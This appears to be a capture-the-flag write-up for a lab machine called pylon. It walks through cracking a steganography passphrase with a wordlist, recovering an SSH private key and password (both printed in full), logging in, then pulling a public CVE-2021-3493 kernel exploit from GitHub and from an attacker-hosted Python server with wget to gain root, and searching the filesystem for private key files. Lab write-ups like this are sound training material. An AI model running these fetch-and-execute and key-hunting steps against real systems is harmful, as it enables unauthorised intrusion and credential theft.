@@ -1,0 +1,235 @@
+So for this room we have a thing we are given a dog image which we need to start extracting before the room goes on.
+
+
+exiftool pepper_1611998632625.jpg 
+ExifTool Version Number         : 13.50
+File Name                       : pepper_1611998632625.jpg
+Directory                       : .
+File Size                       : 390 kB
+File Modification Date/Time     : 2026:05:10 15:06:29+12:45
+File Access Date/Time           : 2026:05:10 15:07:13+12:45
+File Inode Change Date/Time     : 2026:05:10 15:06:46+12:45
+File Permissions                : -rw-rw-r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+XMP Toolkit                     : Image::ExifTool 12.16
+Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)
+Image Width                     : 2551
+Image Height                    : 1913
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 2551x1913
+Megapixels                      : 4.9
+
+ steghide extract -sf pepper_1611998632625.jpg -xf f.txt 
+Enter passphrase: 
+steghide: could not extract any data with that passphrase!
+
+So we are going to use a tool that stegseek which is used to crack password for such files.
+
+
+ stegseek --crack pepper_1611998632625.jpg /usr/share/wordlists/rockyou.txt 
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "pepper"
+[i] Original filename: "lone".
+[i] Extracting to "pepper_1611998632625.jpg.out".
+
+
+Also via exiftool we have seen it's base of encoding and decoding so here we start with it.
+
+ steghide info pepper_1611998632625.jpg
+"pepper_1611998632625.jpg":
+  format: jpeg
+  capacity: 20.6 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+  embedded file "lone":
+    size: 2.0 KB
+    encrypted: rijndael-128, cbc
+    compressed: yes
+
+We can also see this.
+So we see this 
+
+Now let's extract it again with the password.
+
+─(root㉿kali)-[/home/kali/thm/pylon]
+└─# file lone                     
+lone: gzip compressed data, from Unix, original size modulo 2^32 10240
+                                                                                      
+┌──(root㉿kali)-[/home/kali/thm/pylon]
+└─# mv lone lone_decoded.tgz              
+
+
+                                                                                      
+┌──(root㉿kali)-[/home/kali/thm/pylon]
+└─# ls
+f.txt             pepper_1611998632625.jpg      pylon.txt
+lone_decoded.tgz  pepper_1611998632625.jpg.out
+                                                                                      
+┌──(root㉿kali)-[/home/kali/thm/pylon]
+└─# tar zxvf lone_decoded.tgz  
+lone_id
+                                                                                      
+┌──(root㉿kali)-[/home/kali/thm/pylon]
+└─# cat lone_id 
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEA45nVhEtT37sKnNBWH2VYsXbjA8vAK8e04HfrgF06NiGGQsRBLtJw
+YJu73+zGO0AoETo8LYhxB5eI5D9KzboGuTDAuGZQuUq+8N/hBmfavieHLHgkRNBr0ErJ60
+l2FAcDW6pDowfiwC1vsdixQ6L8kvVhdkz0GUfPAlfIRhHHtQaQnQ7wnRtdGjIPK9/S1MPs
+IJOLD2S79NxS7vguw87Mp0cnRjDalaCcRE0ELUvLDKQdZlWba0kF/PciqknkDYq2mbkCRd
+3jWX2Umx0WtP2wCh9BQ/syxTJDXn6mCEsoNI/roLKyB1uGms/pFiBxS0qdiZAAO6CyTkyG
+hZwb1BKmUwAAA8hSynq9Usp6vQAAAAdzc2gtcnNhAAABAQDjmdWES1Pfuwqc0FYfZVixdu
+MDy8Arx7Tgd+uAXTo2IYZCxEEu0nBgm7vf7MY7QCgROjwtiHEHl4jkP0rNuga5MMC4ZlC5
+Sr7w3+EGZ9q+J4cseCRE0GvQSsnrSXYUBwNbqkOjB+LALW+x2LFDovyS9WF2TPQZR88CV8
+hGEce1BpCdDvCdG10aMg8r39LUw+wgk4sPZLv03FLu+C7DzsynRydGMNqVoJxETQQtS8sM
+pB1mVZtrSQX89yKqSeQNiraZuQJF3eNZfZSbHRa0/bAKH0FD+zLFMkNefqYISyg0j+ugsr
+IHW4aaz+kWIHFLSp2JkAA7oLJOTIaFnBvUEqZTAAAAAwEAAQAAAQB+u03U2EzfqzqBjtAl
+szzrtBM8LdvXhOAGjT+ovkCHm6syyiyxcaP5Zz35tdG7dEHbNd4ETJEDdTFYRpXUb90GiU
+sGYpJYWnJvlXmrI3D9qOzvqgYn+xXNaZd9V+5TwIPyKqB2yxFLiQFEujAaRUr2WYPnZ3oU
+CZQO7eoqegQFm5FXLy0zl0elAkEiDrrpS5CNBunv297nHMLFBPIEB231MNbYMDe0SU40NQ
+WAGELdiAQ9i7N/SMjAJYAV2MAjbbzp5uKDUNxb3An85rUWKHXslATDh25abIY0aGZHLP5x
+4B1usmPPLxGTqX19Cm65tkw8ijM6AM9+y4TNj2i3GlQBAAAAgQDN+26ilDtKImrPBv+Akg
+tjsKLL005RLPtKQAlnqYfRJP1xLKKz7ocYdulaYm0syosY+caIzAVcN6lnFoBrzTZ23uwy
+VB0ZsRL/9crywFn9xAE9Svbn6CxGBYQVO6xVCp+GiIXQZHpY7CMVBdANh/EJmGfCJ/gGby
+mut7uOWmfiJAAAAIEA9ak9av7YunWLnDp6ZyUfaRAocSPxt2Ez8+j6m+gwYst+v8cLJ2SJ
+duq0tgz7za8wNrUN3gXAgDzg4VsBUKLS3i41h1DmgqUE5SWgHrhIJw9AL1fo4YumPUkB/0
+S0QMUn16v4S/fnHgZY5KDKSl4hRre5byrsaVK0oluiKsouR4EAAACBAO0uA2IvlaUcSerC
+0OMkML9kGZA7uA52HKR9ZE/B4HR9QQKN4sZ+gOPfiQcuKYaDrfmRCeLddrtIulqY4amVcR
+nx3u2SBx9KM6uqA2w80UlqJb8BVyM4SscUoHdmbqc9Wx5f+nG5Ab8EPPq0FNPrzrBJP5m0
+43kcLdLe8Jv/ETfTAAAAC3B5bG9uQHB5bG9uAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----
+
+Nmap scan report for 10.48.179.211
+Host is up (0.61s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+222/tcp open  rsh-spx
+
+so we have rsa id for lone we tried for connecting to port 22 and then to port 222
+
+so i tried alot and here am i got the hint that we have password so  put itin the github link we have which will be our encryption key with name pepper.
+
+2_[-I2_[0E2DmEK
+
+
+so with this we have beenin.
+
+so  now we choose to start options and we get flag1.
+
+Username = lone
+        Password = +2BRkRuE!w7>ozQ4  
+So we see this and we have it all.
+        
+        
+ ssh lone@10.48.179.211 -i lone_id 
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+lone@10.48.179.211's password: 
+Welcome to
+                   /
+       __         /       __    __
+     /   ) /   / /      /   ) /   )
+    /___/ (___/ /____/ (___/ /   /
+   /         /
+  /      (_ /       by LeonM
+
+lone@pylon:~$ ls
+note_from_pood.gpg  pylon  user1.txt
+lone@pylon:~$ cat user1.txt 
+TMM{easy_does_it}
+lone@pylon:~$ 
+
+so we have got user flag.     
+
+We have ran linpeas on the machine to see what isactually there 
+
+Linux version 4.15.0-140-generic (buildd@lgw01-amd64-054) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubun
+
+some basic    
+
+Now time for priviledge escalation  which is pretty as there is alternate as we ran linpeas.sh 
+
+We found this machine kernel can be exploited with CVE-2021-3493
+
+└─# wget https://github.com/briskets/CVE-2021-3493/releases/download/v1.0/exploit
+
+i used above code then we got exploit.c
+
+so now gcc isnot there on machine we will do one thing.
+
+└─# gcc exploit.c -o exploit -static
+
+and then take via python server to lone in /tmp and then do.
+
+
+--  http://192.168.145.49:8000/exploit
+Connecting to 192.168.145.49:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 834240 (815K) [application/octet-stream]
+Saving to: ‘exploit’
+
+exploit               100%[=======================>] 814.69K   252KB/s    in 3.2s    
+
+2026-05-10 03:40:12 (252 KB/s) - ‘exploit’ saved [834240/834240]
+
+lone@pylon:/tmp$ chmod +x exploit 
+lone@pylon:/tmp$ ./exploit 
+bash-4.4# ls
+exploit
+
+
+ find / -type f -name 'user2.txt' 2>/dev/null 
+/home/pood/user2.txt
+
+we  have user2.txt also now moving too root.txt
+
+now we can't directly read root.txt as of gpg format.
+
+find / -name "*.gpg" -o -name "*.asc" -o -name "*.key" 2>/dev/null
+/home/pood/.gnupg/trustdb.gpg
+/home/pood/.gnupg/private-keys-v1.d/7A98953B42616F59EFEA8E394B66BF154C0261CF.key
+/home/pood/.gnupg/private-keys-v1.d/178C4E5256A5DC6F33535449465D4CD32DDA8640.key
+/home/lone/.gnupg/trustdb.gpg
+/home/lone/.gnupg/private-keys-v1.d/451F592A540F6DA2EB695CD01C649A0420CF9146.key
+/home/lone/.gnupg/private-keys-v1.d/ED93E444B0BA7F09598BD009782D5DF0376D5D5F.key
+/home/lone/note_from_pood.gpg
+/root/root.txt.gpg
+/root/.gnupg/trustdb.gpg
+/root/.gnupg/private-keys-v1.d/55DDC8C85FD4E8213B6ABAEE944FCD2A668B0E16.key
+/root/.gnupg/private-keys-v1.d/3424FE532BA79792A3E9868130F9687A15DF5599.key
+/usr/share/doc/openvpn/examples/sample-keys/ca.key
+/usr/share/doc/openvpn/examples/sample-keys/client-ec.key
+/usr/share/doc/openvpn/examples/sample-keys/client.key
+/usr/share/doc/openvpn/examples/sample-keys/ta.key
+/usr/share/doc/openvpn/examples/sample-keys/server.key
+/usr/share/doc/openvpn/examples/sample-keys/client-pass.key
+/usr/share/doc/openvpn/examples/sample-keys/server-ec.key
+/usr/share/dns/root.key
+/usr/share/popularity-contest/debian-popcon.gpg
+/usr/share/gnupg/distsigkey.gpg
+/usr/share/keyrings/ubuntu-master-keyring.gpg
+/usr/share/keyrings/ubuntu-fips-keyring.gpg
+/usr/share/keyrings/ubuntu-esm-keyring.gpg
+/usr/share/keyrings/ubuntu-archive-keyring.gpg
+/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
+/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
+/usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
+/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
+/etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
+/etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
+/etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
+/etc/apt/trusted.gpg
+/etc/openvpn/ta.key
+/etc/openvpn/server.key
+
+and then rootflag.ThM{OpenVPN_script_pwn}
+
+
